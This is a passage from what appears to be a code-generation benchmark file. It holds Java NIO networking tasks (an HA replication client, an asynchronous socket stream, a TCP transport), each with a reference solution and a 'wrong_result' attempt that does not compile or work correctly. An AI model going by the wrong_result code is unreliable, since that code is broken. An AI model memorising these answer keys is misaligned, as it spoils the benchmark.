(chan.isConnectionPending()) {\n                    try {\n                        chan.finishConnect();\n                    } catch (Exception e) {\n                        e.printStackTrace();\n                    }\n                }\n                key.interestOps(SelectionKey.OP_READ | SelectionKey.OP_WRITE);\n                key.attach(this);\n                conMan.selector.wakeup();\n            } else if (key.isReadable()) {\n                read();\n            } else if (key.isWritable()) {\n                if (!writeQueue.isEmpty()) {\n                    toWrite = writeQueue.poll();\n                    if (toWrite != null) {\n                        int n = chan.write(toWrite);\n                        if (n > 0) {\n                            toWrite.position(0);\n                            toWrite.limit(toWrite.capacity());\n                        } else {\n                            awaitingWriteNotification = true;\n                        }\n                    }\n                }\n            }\n        }\n\n        public void read() {\n            try {\n                int n = chan.read(oblivion);\n                if (n > 0) {\n                    // Process data, but it's discarded\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n\n        public void doStateChecks(long now) {\n            // Check if connection is still valid\n        }\n\n        public int calcInterestOps() {\n            int ops = 0;\n            if (chan.isOpen()) {\n                ops |= SelectionKey.OP_READ;\n                if (!writeQueue.isEmpty()) {\n                    ops |= SelectionKey.OP_WRITE;\n                }\n            }\n            return ops;\n        }\n    }\n}"
  },
  {
    "Task_id": 431,
    "Instruction": "Task Description: Implement a Java class for a High Availability (HA) client that manages communication with a master server using non-blocking I/O (NIO) techniques. The client should handle connection management, data reporting, and read event processing.\n\nClass Description: DefaultHAClient is a service thread that maintains a connection to a master server for high availability purposes. It uses Java NIO's SocketChannel and Selector for non-blocking communication, manages buffer operations for data transfer, and handles connection lifecycle events.\n\nAttributes:\n- READ_MAX_BUFFER_SIZE: [int] - Maximum buffer size for reading data (4MB)\n- masterHaAddress: [AtomicReference<String>] - Atomic reference to the master server's address\n- reportOffset: [ByteBuffer] - Buffer for reporting slave offset to master (8 bytes)\n- socketChannel: [SocketChannel] - Channel for communication with master\n- selector: [Selector] - Selector for non-blocking I/O operations\n- lastReadTimestamp: [long] - Timestamp of last successful read operation\n- lastWriteTimestamp: [long] - Timestamp of last successful write operation\n- currentReportedOffset: [long] - Current offset reported to master\n- dispatchPosition: [int] - Position in read buffer for dispatching data\n- byteBufferRead: [ByteBuffer] - Primary buffer for reading data\n- byteBufferBackup: [ByteBuffer] - Backup buffer for buffer reallocation\n- defaultMessageStore: [DefaultMessageStore] - Reference to the message store for offset information\n\nMethods:\n- DefaultHAClient([DefaultMessageStore defaultMessageStore]) -> [void] - Constructor that initializes selector and message store reference\n- updateHaMasterAddress([String newAddr]) -> [void] - Updates the master server address atomically\n- reportSlaveMaxOffset([long maxOffset]) -> [boolean] - Reports the slave's maximum offset to master, returns success status\n- reallocateByteBuffer() -> [void] - Reallocates and swaps read buffers when needed\n- swapByteBuffer() -> [void] - Swaps primary and backup byte buffers\n- processReadEvent() -> [boolean] - Processes read events from socket channel, returns success status\n- connectMaster() -> [boolean] - Connects to master server, returns connection status\n- closeMaster() -> [void] - Closes connection with master and cleans up resources\n- shutdown() -> [void] - Shuts down the client by closing all resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.SocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.ClosedChannelException;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.util.concurrent.atomic.AtomicReference;\nimport org.apache.rocketmq.common.ServiceThread;\nimport org.apache.rocketmq.common.utils.NetworkUtil;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\nimport org.apache.rocketmq.store.DefaultMessageStore;\n\npublic class DefaultHAClient extends ServiceThread implements HAClient {\n\n    private static final int READ_MAX_BUFFER_SIZE = 1024 * 1024 * 4;\n    private final AtomicReference<String> masterHaAddress = new AtomicReference<>();\n    private final ByteBuffer reportOffset = ByteBuffer.allocate(8);\n    private SocketChannel socketChannel;\n    private Selector selector;\n    private long lastReadTimestamp = System.currentTimeMillis();\n    private long lastWriteTimestamp = System.currentTimeMillis();\n    private long currentReportedOffset = 0;\n    private int dispatchPosition = 0;\n    private ByteBuffer byteBufferRead = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n    private ByteBuffer byteBufferBackup = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n    private DefaultMessageStore defaultMessageStore;\n\n    public DefaultHAClient(DefaultMessageStore defaultMessageStore) throws IOException {\n        this.selector = NetworkUtil.openSelector();\n        this.defaultMessageStore = defaultMessageStore;\n    }\n\n    public void updateHaMasterAddress(final String newAddr) {\n        String currentAddr = this.masterHaAddress.get();\n        if (masterHaAddress.compareAndSet(currentAddr, newAddr)) {\n            log.info(\"update master ha address, OLD: \" + currentAddr + \" NEW: \" + newAddr);\n        }\n    }\n\n    private boolean reportSlaveMaxOffset(final long maxOffset) {\n        this.reportOffset.position(0);\n        this.reportOffset.limit(8);\n        this.reportOffset.putLong(maxOffset);\n        this.reportOffset.position(0);\n        this.reportOffset.limit(8);\n\n        for (int i = 0; i < 3 && this.reportOffset.hasRemaining(); i++) {\n            try {\n                this.socketChannel.write(this.reportOffset);\n            } catch (IOException e) {\n                log.error(this.getServiceName()\n                    + \"reportSlaveMaxOffset this.socketChannel.write exception\", e);\n                return false;\n            }\n        }\n        lastWriteTimestamp = this.defaultMessageStore.getSystemClock().now();\n        return !this.reportOffset.hasRemaining();\n    }\n\n    private void reallocateByteBuffer() {\n        int remain = READ_MAX_BUFFER_SIZE - this.dispatchPosition;\n        if (remain > 0) {\n            this.byteBufferRead.position(this.dispatchPosition);\n            this.byteBufferBackup.position(0);\n            this.byteBufferBackup.limit(READ_MAX_BUFFER_SIZE);\n            this.byteBufferBackup.put(this.byteBufferRead);\n        }\n\n        this.swapByteBuffer();\n        this.byteBufferRead.position(remain);\n        this.byteBufferRead.limit(READ_MAX_BUFFER_SIZE);\n        this.dispatchPosition = 0;\n    }\n\n    private void swapByteBuffer() {\n        ByteBuffer tmp = this.byteBufferRead;\n        this.byteBufferRead = this.byteBufferBackup;\n        this.byteBufferBackup = tmp;\n    }\n\n    private boolean processReadEvent() {\n        int readSizeZeroTimes = 0;\n        while (this.byteBufferRead.hasRemaining()) {\n            try {\n                int readSize = this.socketChannel.read(this.byteBufferRead);\n                if (readSize > 0) {\n                    readSizeZeroTimes = 0;\n                    boolean result = this.dispatchReadRequest();\n                    if (!result) {\n                        log.error(\"HAClient, dispatchReadRequest error\");\n                        return false;\n                    }\n                    lastReadTimestamp = System.currentTimeMillis();\n                } else if (readSize == 0) {\n                    if (++readSizeZeroTimes >= 3) {\n                        break;\n                    }\n                } else {\n                    log.info(\"HAClient, processReadEvent read socket < 0\");\n                    return false;\n                }\n            } catch (IOException e) {\n                log.info(\"HAClient, processReadEvent read socket exception\", e);\n                return false;\n            }\n        }\n        return true;\n    }\n\n    public boolean connectMaster() throws ClosedChannelException {\n        if (null == socketChannel) {\n            String addr = this.masterHaAddress.get();\n            if (addr != null) {\n                SocketAddress socketAddress = NetworkUtil.string2SocketAddress(addr);\n                this.socketChannel = RemotingHelper.connect(socketAddress);\n                if (this.socketChannel != null) {\n                    this.socketChannel.register(this.selector, SelectionKey.OP_READ);\n                    log.info(\"HAClient connect to master {}\", addr);\n                }\n            }\n            this.currentReportedOffset = this.defaultMessageStore.getMaxPhyOffset();\n            this.lastReadTimestamp = System.currentTimeMillis();\n        }\n        return this.socketChannel != null;\n    }\n\n    public void closeMaster() {\n        if (null != this.socketChannel) {\n            try {\n                SelectionKey sk = this.socketChannel.keyFor(this.selector);\n                if (sk != null) {\n                    sk.cancel();\n                }\n                this.socketChannel.close();\n                this.socketChannel = null;\n                log.info(\"HAClient close connection with master {}\", this.masterHaAddress.get());\n            } catch (IOException e) {\n                log.warn(\"closeMaster exception. \", e);\n            }\n            this.lastReadTimestamp = 0;\n            this.dispatchPosition = 0;\n            this.byteBufferBackup.position(0);\n            this.byteBufferBackup.limit(READ_MAX_BUFFER_SIZE);\n            this.byteBufferRead.position(0);\n            this.byteBufferRead.limit(READ_MAX_BUFFER_SIZE);\n        }\n    }\n\n    @Override\n    public void shutdown() {\n        super.shutdown();\n        closeMaster();\n        try {\n            this.selector.close();\n        } catch (IOException e) {\n            log.warn(\"Close the selector of AutoRecoverHAClient error, \", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class DefaultHAClient {\n    private static final int READ_MAX_BUFFER_SIZE = 4 * 1024 * 1024;\n    private final AtomicReference<String> masterHaAddress = new AtomicReference<>();\n    private final ByteBuffer reportOffset = ByteBuffer.allocate(8);\n    private SocketChannel socketChannel;\n    private Selector selector;\n    private long lastReadTimestamp;\n    private long lastWriteTimestamp;\n    private long currentReportedOffset;\n    private int dispatchPosition;\n    private ByteBuffer byteBufferRead;\n    private ByteBuffer byteBufferBackup;\n    private final DefaultMessageStore defaultMessageStore;\n\n    public DefaultHAClient(DefaultMessageStore defaultMessageStore) {\n        this.defaultMessageStore = defaultMessageStore;\n        selector = Selector.open();\n        byteBufferRead = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n        byteBufferBackup = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n    }\n\n    public void updateHaMasterAddress(String newAddr) {\n        masterHaAddress.set(newAddr);\n    }\n\n    public boolean reportSlaveMaxOffset(long maxOffset) {\n        reportOffset.clear();\n        reportOffset.putLong(0, maxOffset);\n        int bytesWritten = socketChannel.write(reportOffset);\n        return bytesWritten == 8;\n    }\n\n    private void reallocateByteBuffer() {\n        if (byteBufferRead.remaining() < 1024) {\n            swapByteBuffer();\n        }\n    }\n\n    private void swapByteBuffer() {\n        ByteBuffer temp = byteBufferRead;\n        byteBufferRead = byteBufferBackup;\n        byteBufferBackup = temp;\n    }\n\n    private boolean processReadEvent() {\n        try {\n            int bytesRead = socketChannel.read(byteBufferRead);\n            if (bytesRead > 0) {\n                lastReadTimestamp = System.currentTimeMillis();\n                byteBufferRead.flip();\n                // Process data here\n                byteBufferRead.clear();\n                return true;\n            } else if (bytesRead == 0) {\n                return false;\n            } else {\n                closeMaster();\n                return false;\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            closeMaster();\n            return false;\n        }\n    }\n\n    public boolean connectMaster() {\n        String address = masterHaAddress.get();\n        if (address == null || address.isEmpty()) {\n            return false;\n        }\n        try {\n            socketChannel = SocketChannel.open();\n            socketChannel.configureBlocking(false);\n            InetSocketAddress addr = new InetSocketAddress(address, 9999);\n            socketChannel.connect(addr);\n            socketChannel.register(selector, SelectionKey.OP_READ);\n            return true;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    private void closeMaster() {\n        try {\n            if (socketChannel != null) {\n                socketChannel.close();\n            }\n            if (selector != null) {\n                selector.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        closeMaster();\n    }\n}"
  },
  {
    "Task_id": 432,
    "Instruction": "Task Description: Create a Java class that implements asynchronous TCP client functionality using java.nio channels for non-blocking network communication, with support for connection management, socket configuration, and asynchronous I/O operations.\n\nClass Description: AsynchronousSocketChannelStream is a class that provides asynchronous TCP client functionality using Java NIO's AsynchronousSocketChannel. It handles connection establishment, socket configuration, and asynchronous read/write operations with support for connection retries and error handling.\n\nAttributes:\n- serverAddress: [ServerAddress] - The target server address to connect to\n- inetAddressResolver: [InetAddressResolver] - Resolves hostnames to IP addresses\n- settings: [SocketSettings] - Configuration for socket options and timeouts\n- group: [AsynchronousChannelGroup] - Optional channel group for resource management\n\nMethods:\n- openAsync([OperationContext operationContext], [AsyncCompletionHandler<Void> handler]) -> [void] - Initiates an asynchronous connection to the server, with completion notified via handler\n- initializeSocketChannel([AsyncCompletionHandler<Void> handler], [Queue<SocketAddress> socketAddressQueue]) -> [void] - Internal method to attempt connection to a socket address\n- OpenCompletionHandler([AsyncCompletionHandler<Void> handler], [Queue<SocketAddress> socketAddressQueue], [AsynchronousSocketChannel attemptConnectionChannel]) -> [void] - Handles connection completion/failure and manages retry logic\n- AsynchronousSocketChannelAdapter([AsynchronousSocketChannel channel]) -> [void] - Wrapper class that implements ExtendedAsynchronousByteChannel interface for I/O operations\n\nThe OpenCompletionHandler nested class provides:\n- completed([Void result], [Object attachment]) -> [void] - Handles successful connection\n- failed([Throwable exc], [Object attachment]) -> [void] - Handles connection failure and manages retries\n\nThe AsynchronousSocketChannelAdapter nested class provides:\n- Various read/write methods with timeout support -> [Future/void] - Implements asynchronous I/O operations\n- isOpen() -> [boolean] - Checks if channel is open\n- close() -> [void] - Closes the channel",
    "Canonical_solution": "import com.mongodb.MongoSocketException;\nimport com.mongodb.MongoSocketOpenException;\nimport com.mongodb.ServerAddress;\nimport com.mongodb.connection.AsyncCompletionHandler;\nimport com.mongodb.connection.SocketSettings;\nimport com.mongodb.lang.Nullable;\nimport com.mongodb.spi.dns.InetAddressResolver;\n\nimport java.io.IOException;\nimport java.net.SocketAddress;\nimport java.net.StandardSocketOptions;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.AsynchronousChannelGroup;\nimport java.nio.channels.AsynchronousSocketChannel;\nimport java.nio.channels.CompletionHandler;\nimport java.util.LinkedList;\nimport java.util.Queue;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicReference;\n\nimport static com.mongodb.internal.connection.ServerAddressHelper.getSocketAddresses;\n\npublic final class AsynchronousSocketChannelStream extends AsynchronousChannelStream {\n    private final ServerAddress serverAddress;\n    private final InetAddressResolver inetAddressResolver;\n    private final SocketSettings settings;\n    @Nullable\n    private final AsynchronousChannelGroup group;\n\n    public AsynchronousSocketChannelStream(\n            final ServerAddress serverAddress, final InetAddressResolver inetAddressResolver,\n            final SocketSettings settings, final PowerOfTwoBufferPool bufferProvider,\n            @Nullable final AsynchronousChannelGroup group) {\n        super(serverAddress, settings, bufferProvider);\n        this.serverAddress = serverAddress;\n        this.inetAddressResolver = inetAddressResolver;\n        this.settings = settings;\n        this.group = group;\n    }\n\n    @Override\n    public void openAsync(final OperationContext operationContext, final AsyncCompletionHandler<Void> handler) {\n        Queue<SocketAddress> socketAddressQueue;\n\n        try {\n            socketAddressQueue = new LinkedList<>(getSocketAddresses(serverAddress, inetAddressResolver));\n        } catch (Throwable t) {\n            handler.failed(t);\n            return;\n        }\n\n        initializeSocketChannel(handler, socketAddressQueue);\n    }\n\n    private void initializeSocketChannel(final AsyncCompletionHandler<Void> handler, final Queue<SocketAddress> socketAddressQueue) {\n        if (socketAddressQueue.isEmpty()) {\n            handler.failed(new MongoSocketException(\"Exception opening socket\", serverAddress));\n        } else {\n            SocketAddress socketAddress = socketAddressQueue.poll();\n\n            try {\n                AsynchronousSocketChannel attemptConnectionChannel;\n                attemptConnectionChannel = group == null\n                        ? AsynchronousSocketChannel.open()\n                        : AsynchronousSocketChannel.open(group);\n                attemptConnectionChannel.setOption(StandardSocketOptions.TCP_NODELAY, true);\n                attemptConnectionChannel.setOption(StandardSocketOptions.SO_KEEPALIVE, true);\n                if (settings.getReceiveBufferSize() > 0) {\n                    attemptConnectionChannel.setOption(StandardSocketOptions.SO_RCVBUF, settings.getReceiveBufferSize());\n                }\n                if (settings.getSendBufferSize() > 0) {\n                    attemptConnectionChannel.setOption(StandardSocketOptions.SO_SNDBUF, settings.getSendBufferSize());\n                }\n\n                attemptConnectionChannel.connect(socketAddress, null,\n                        new OpenCompletionHandler(handler, socketAddressQueue, attemptConnectionChannel));\n            } catch (IOException e) {\n                handler.failed(new MongoSocketOpenException(\"Exception opening socket\", serverAddress, e));\n            } catch (Throwable t) {\n                handler.failed(t);\n            }\n        }\n    }\n\n    private class OpenCompletionHandler implements CompletionHandler<Void, Object>  {\n        private final AtomicReference<AsyncCompletionHandler<Void>> handlerReference;\n        private final Queue<SocketAddress> socketAddressQueue;\n        private final AsynchronousSocketChannel attemptConnectionChannel;\n\n        OpenCompletionHandler(final AsyncCompletionHandler<Void> handler, final Queue<SocketAddress> socketAddressQueue,\n                              final AsynchronousSocketChannel attemptConnectionChannel) {\n            this.handlerReference = new AtomicReference<>(handler);\n            this.socketAddressQueue = socketAddressQueue;\n            this.attemptConnectionChannel = attemptConnectionChannel;\n        }\n\n        @Override\n        public void completed(final Void result, final Object attachment) {\n            setChannel(new AsynchronousSocketChannelAdapter(attemptConnectionChannel));\n            handlerReference.getAndSet(null).completed(null);\n        }\n\n        @Override\n        public void failed(final Throwable exc, final Object attachment) {\n            AsyncCompletionHandler<Void> localHandler = handlerReference.getAndSet(null);\n\n            if (socketAddressQueue.isEmpty()) {\n                if (exc instanceof IOException) {\n                    localHandler.failed(new MongoSocketOpenException(\"Exception opening socket\", getAddress(), exc));\n                } else {\n                    localHandler.failed(exc);\n                }\n            } else {\n                initializeSocketChannel(localHandler, socketAddressQueue);\n            }\n        }\n    }\n\n    private static final class AsynchronousSocketChannelAdapter implements ExtendedAsynchronousByteChannel {\n        private final AsynchronousSocketChannel channel;\n\n        private AsynchronousSocketChannelAdapter(final AsynchronousSocketChannel channel) {\n            this.channel = channel;\n        }\n\n        @Override\n        public <A> void read(final ByteBuffer dst, final long timeout, final TimeUnit unit, @Nullable final A attach,\n                             final CompletionHandler<Integer, ? super A> handler) {\n            channel.read(dst, timeout, unit, attach, handler);\n        }\n\n        @Override\n        public <A> void read(final ByteBuffer[] dsts, final int offset, final int length, final long timeout, final TimeUnit unit,\n                             @Nullable final A attach, final CompletionHandler<Long, ? super A> handler) {\n            channel.read(dsts, offset, length, timeout, unit, attach, handler);\n        }\n\n        @Override\n        public <A> void write(final ByteBuffer src, final long timeout, final TimeUnit unit, final A attach,\n                              final CompletionHandler<Integer, ? super A> handler) {\n            channel.write(src, timeout, unit, attach, handler);\n        }\n\n        @Override\n        public <A> void write(final ByteBuffer[] srcs, final int offset, final int length, final long timeout, final TimeUnit unit,\n                              final A attach, final CompletionHandler<Long, ? super A> handler) {\n            channel.write(srcs, offset, length, timeout, unit, attach, handler);\n        }\n\n        @Override\n        public <A> void read(final ByteBuffer dst, final A attachment, final CompletionHandler<Integer, ? super A> handler) {\n            channel.read(dst, attachment, handler);\n        }\n\n        @Override\n        public Future<Integer> read(final ByteBuffer dst) {\n            return channel.read(dst);\n        }\n\n        @Override\n        public <A> void write(final ByteBuffer src, final A attachment, final CompletionHandler<Integer, ? super A> handler) {\n            channel.write(src, attachment, handler);\n        }\n\n        @Override\n        public Future<Integer> write(final ByteBuffer src) {\n            return channel.write(src);\n        }\n\n        @Override\n        public boolean isOpen() {\n            return channel.isOpen();\n        }\n\n        @Override\n        public void close() throws IOException {\n            channel.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "public class AsynchronousSocketChannelStream {\n    private final ServerAddress serverAddress;\n    private final InetAddressResolver inetAddressResolver;\n    private final SocketSettings settings;\n    private final AsynchronousChannelGroup group;\n    private AsynchronousSocketChannel channel;\n    private AsynchronousSocketChannelAdapter adapter;\n\n    public AsynchronousSocketChannelStream(ServerAddress serverAddress, InetAddressResolver inetAddressResolver, SocketSettings settings, AsynchronousChannelGroup group) {\n        this.serverAddress = serverAddress;\n        this.inetAddressResolver = inetAddressResolver;\n        this.settings = settings;\n        this.group = group;\n    }\n\n    public void openAsync(OperationContext operationContext, AsyncCompletionHandler<Void> handler) {\n        inetAddressResolver.resolve(serverAddress, (addresses, exception) -> {\n            if (exception != null) {\n                handler.failed(exception, this);\n                return;\n            }\n            Queue<SocketAddress> socketAddressQueue = new LinkedList<>(addresses);\n            initializeSocketChannel(handler, socketAddressQueue);\n        });\n    }\n\n    private void initializeSocketChannel(AsyncCompletionHandler<Void> handler, Queue<SocketAddress> socketAddressQueue) {\n        if (socketAddressQueue.isEmpty()) {\n            handler.failed(new IOException(\"No addresses available\"), this);\n            return;\n        }\n        SocketAddress nextAddress = socketAddressQueue.poll();\n        try {\n            channel = AsynchronousSocketChannel.open(group);\n            channel.configureBlocking(false);\n            channel.connect(nextAddress, null, new OpenCompletionHandler(handler, socketAddressQueue, channel));\n        } catch (IOException e) {\n            handler.failed(e, this);\n        }\n    }\n\n    private static class OpenCompletionHandler implements AsyncCompletionHandler<Void> {\n        private final AsyncCompletionHandler<Void> handler;\n        private final Queue<SocketAddress> socketAddressQueue;\n        private final AsynchronousSocketChannel attemptConnectionChannel;\n\n        public OpenCompletionHandler(AsyncCompletionHandler<Void> handler, Queue<SocketAddress> socketAddressQueue, AsynchronousSocketChannel attemptConnectionChannel) {\n            this.handler = handler;\n            this.socketAddressQueue = socketAddressQueue;\n            this.attemptConnectionChannel = attemptConnectionChannel;\n        }\n\n        @Override\n        public void completed(Void result, Object attachment) {\n            adapter = new AsynchronousSocketChannelAdapter(attemptConnectionChannel);\n            handler.completed(result, attachment);\n        }\n\n        @Override\n        public void failed(Throwable exc, Object attachment) {\n            if (!socketAddressQueue.isEmpty()) {\n                initializeSocketChannel(handler, socketAddressQueue);\n            } else {\n                handler.failed(exc, attachment);\n            }\n        }\n    }\n\n    private static class AsynchronousSocketChannelAdapter {\n        private final AsynchronousSocketChannel channel;\n\n        public AsynchronousSocketChannelAdapter(AsynchronousSocketChannel channel) {\n            this.channel = channel;\n        }\n\n        public Future<Integer> read(ByteBuffer dst, SocketAddress remoteAddress, AsyncCompletionHandler<Integer> handler) {\n            return channel.read(dst, remoteAddress, handler);\n        }\n\n        public Future<Integer> write(ByteBuffer src, AsyncCompletionHandler<Integer> handler) {\n            return channel.write(src, handler);\n        }\n\n        public boolean isOpen() {\n            return channel.isOpen();\n        }\n\n        public void close() {\n            channel.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 433,
    "Instruction": "Task Description: Implement a Java class that facilitates TCP-based communication using Java NIO (Non-blocking I/O) techniques, supporting both client and server modes with configurable options.\n\nClass Description: NioTransport is a class that provides TCP communication capabilities using Java NIO. It can operate in either server or client mode, supports direct buffers for performance optimization, and includes methods for starting/stopping communication, sending data, and receiving data through a callback mechanism.\n\nAttributes:\n- srv_channel: [ServerSocketChannel] - Server socket channel used in server mode\n- client_channel: [SocketChannel] - Client socket channel for communication\n- receiver_thread: [Receiver] - Thread handling incoming data reception\n- receiver: [RtReceiver] - Callback interface for received data\n- host: [InetAddress] - Host address for connection\n- port: [int] - Port number for communication (default: 7800)\n- server: [boolean] - Flag indicating if operating in server mode\n- direct_buffers: [boolean] - Flag indicating whether to use direct buffers\n- log: [Log] - Logger instance for logging messages\n\nMethods:\n- options(String... options) -> [void] - Configures transport options including server/client mode, host, port, and buffer type\n- receiver(RtReceiver receiver) -> [void] - Sets the receiver callback for incoming data\n- start(String... options) -> [void] - Starts the transport in either server or client mode based on configuration\n- stop() -> [void] - Stops the transport and releases resources\n- send(Object dest, byte[] buf, int offset, int length) -> [void] - Sends data through the established channel\n- Receiver.run() -> [void] - (Inner class method) Continuously receives data and forwards it to the registered receiver",
    "Canonical_solution": "import org.jgroups.logging.Log;\nimport org.jgroups.logging.LogFactory;\nimport org.jgroups.tests.RoundTrip;\nimport org.jgroups.tests.rt.RtReceiver;\nimport org.jgroups.tests.rt.RtTransport;\nimport org.jgroups.util.Util;\n\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.List;\n\npublic class NioTransport implements RtTransport {\n    protected ServerSocketChannel srv_channel;\n    protected SocketChannel       client_channel;\n    protected Receiver            receiver_thread;\n    protected RtReceiver          receiver;\n    protected InetAddress         host;\n    protected int                 port=7800;\n    protected boolean             server, direct_buffers;\n    protected final Log           log=LogFactory.getLog(NioTransport.class);\n\n    public NioTransport() {\n    }\n\n    public void options(String... options) throws Exception {\n        if(options == null)\n            return;\n        for(int i=0; i < options.length; i++) {\n            if(options[i].equals(\"-server\")) {\n                server=true;\n                continue;\n            }\n            if(options[i].equals(\"-host\")) {\n                host=InetAddress.getByName(options[++i]);\n                continue;\n            }\n            if(options[i].equals(\"-port\")) {\n                port=Integer.parseInt(options[++i]);\n                continue;\n            }\n            if(options[i].equals(\"-direct\")) {\n                direct_buffers=Boolean.parseBoolean(options[++i]);\n            }\n        }\n        if(host == null)\n            host=InetAddress.getLocalHost();\n    }\n\n    public void receiver(RtReceiver receiver) {\n        this.receiver=receiver;\n    }\n\n    public void start(String ... options) throws Exception {\n        options(options);\n        if(server) {\n            srv_channel=ServerSocketChannel.open();\n            srv_channel.bind(new InetSocketAddress(host, port), 50);\n            System.out.println(\"server started (ctrl-c to kill)\");\n            for(;;) {\n                client_channel=srv_channel.accept();\n                receiver_thread=new Receiver();\n                receiver_thread.start();\n            }\n        }\n        else {\n            client_channel=SocketChannel.open();\n            client_channel.connect(new InetSocketAddress(host, port));\n            receiver_thread=new Receiver();\n            receiver_thread.start();\n        }\n    }\n\n    public void stop() {\n        Util.close(srv_channel, client_channel);\n    }\n\n    public void send(Object dest, byte[] buf, int offset, int length) throws Exception {\n        ByteBuffer sbuf=ByteBuffer.wrap(buf, offset, length);\n        client_channel.write(sbuf);\n    }\n\n    protected class Receiver extends Thread {\n        public void run() {\n            ByteBuffer buf=direct_buffers? ByteBuffer.allocateDirect(RoundTrip.PAYLOAD) : ByteBuffer.allocate(RoundTrip.PAYLOAD);\n            for(;;) {\n                try {\n                    buf.position(0);\n                    int num=client_channel.read(buf);\n                    if(num == -1)\n                        break;\n                    if(num != RoundTrip.PAYLOAD)\n                        throw new IllegalStateException(\"expected \" + RoundTrip.PAYLOAD + \" bytes, but got only \" + num);\n                    if(receiver != null) {\n                        buf.flip();\n                        int offset=buf.hasArray()? buf.arrayOffset() + buf.position() : buf.position(), len=buf.remaining();\n                        if(!buf.isDirect())\n                            receiver.receive(null, buf.array(), offset, len);\n                        else {\n                            byte[] tmp=new byte[len];\n                            buf.get(tmp, 0, len);\n                            receiver.receive(null, tmp, 0, len);\n                        }\n                    }\n                }\n                catch(Exception e) {\n                    e.printStackTrace();\n                }\n            }\n            Util.close(client_channel);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "public class NioTransport {\n    private ServerSocketChannel srv_channel;\n    private SocketChannel client_channel;\n    private Thread receiver_thread;\n    private RtReceiver receiver;\n    private InetAddress host;\n    private int port = 7800;\n    private boolean server = false;\n    private boolean direct_buffers = false;\n    private Log log;\n\n    public void options(String... options) {\n        for (String opt : options) {\n            if (opt.startsWith(\"server=\")) {\n                server = Boolean.parseBoolean(opt.substring(7));\n            } else if (opt.startsWith(\"host=\")) {\n                try {\n                    host = InetAddress.getByName(opt.substring(5));\n                } catch (Exception e) {\n                    log.error(\"Invalid host: \" + opt);\n                }\n            } else if (opt.startsWith(\"port=\")) {\n                try {\n                    port = Integer.parseInt(opt.substring(5));\n                } catch (Exception e) {\n                    log.error(\"Invalid port: \" + opt);\n                }\n            } else if (opt.startsWith(\"directBuffers=\")) {\n                direct_buffers = Boolean.parseBoolean(opt.substring(14));\n            }\n        }\n    }\n\n    public void receiver(RtReceiver receiver) {\n        this.receiver = receiver;\n    }\n\n    public void start(String... options) {\n        options(options);\n        if (server) {\n            try {\n                srv_channel = ServerSocketChannel.open();\n                srv_channel.configureBlocking(false);\n                srv_channel.bind(new InetSocketAddress(host, port));\n                SocketChannel client = srv_channel.accept();\n                client.configureBlocking(false);\n                receiver_thread = new Thread(new Receiver(client));\n                receiver_thread.start();\n            } catch (Exception e) {\n                log.error(\"Error starting server: \" + e.getMessage());\n            }\n        } else {\n            try {\n                client_channel = SocketChannel.open();\n                client_channel.configureBlocking(false);\n                client_channel.connect(new InetSocketAddress(host, port));\n                receiver_thread = new Thread(new Receiver(client_channel));\n                receiver_thread.start();\n            } catch (Exception e) {\n                log.error(\"Error starting client: \" + e.getMessage());\n            }\n        }\n    }\n\n    public void stop() {\n        if (server) {\n            try {\n                srv_channel.close();\n            } catch (Exception e) {\n                log.error(\"Error closing server channel: \" + e.getMessage());\n            }\n        } else {\n            try {\n                client_channel.close();\n            } catch (Exception e) {\n                log.error(\"Error closing client channel: \" + e.getMessage());\n            }\n        }\n        if (receiver_thread != null) {\n            receiver_thread.interrupt();\n        }\n    }\n\n    public void send(Object dest, byte[] buf, int offset, int length) {\n        if (server) {\n            try {\n                ByteBuffer buffer = direct_buffers ? ByteBuffer.allocateDirect(length) : ByteBuffer.allocate(length);\n                buffer.put(buf, offset, length);\n                buffer.flip();\n                client_channel.write(buffer);\n            } catch (Exception e) {\n                log.error(\"Error sending data: \" + e.getMessage());\n            }\n        } else {\n            try {\n                ByteBuffer buffer = direct_buffers ? ByteBuffer.allocateDirect(length) : ByteBuffer.allocate(length);\n                buffer.put(buf, offset, length);\n                buffer.flip();\n                client_channel.write(buffer);\n            } catch (Exception e) {\n                log.error(\"Error sending data: \" + e.getMessage());\n            }\n        }\n    }\n\n    private class Receiver implements Runnable {\n        private SocketChannel channel;\n\n        public Receiver(SocketChannel channel) {\n            this.channel = channel;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (!Thread.currentThread().isInterrupted()) {\n                    ByteBuffer buffer = ByteBuffer.allocate(1024);\n                    int bytesRead = channel.read(buffer);\n                    if (bytesRead > 0) {\n                        buffer.flip();\n                        byte[] data = new byte[bytesRead];\n                        buffer.get(data);\n                        receiver.onReceived(data);\n                    }\n                }\n            } catch (Exception e) {\n                log.error(\"Error receiving data: \" + e.getMessage());\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 435,
